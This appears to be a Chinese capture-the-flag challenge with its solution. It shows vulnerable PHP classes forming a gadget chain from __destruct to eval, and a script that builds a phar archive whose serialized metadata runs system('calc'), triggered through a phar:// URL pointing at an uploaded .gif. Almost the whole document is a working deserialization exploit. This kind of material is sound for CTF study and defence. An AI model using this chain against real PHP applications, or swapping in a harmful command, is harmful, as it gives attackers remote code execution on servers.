题目
```php
class Base{
    public function reset()
    {
        if ($this->dataReader !== null) {
            $this->dataReader->close();
        }
    }

    public function __destruct(){$this->reset();}
}

class Stream
{
    public function close()
    {
        return call_user_func($this->closes);
    }
}

class Mock
{
    public function generate()
    {
        if (!class_exists($this->mockName, false)) {
            eval($this->classCode);
        }
        return $this->mockName;
    }
}

```

```php
<?php

class Base{}
class Stream {}
class Mock {}

$a = new Base();
$a->dataReader = new Stream();

$m = new Mock();
$m->mockName = "aa";
$m->classCode = "system('calc');";

$a->dataReader->closes = array($m, "generate");

//echo urlencode(serialize($a));
$phar = new Phar("app.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

//http://localhost/index.php?filename=phar://tmp/265ac36f15b9230316ccb0e6806a8031.gif/test.txt
```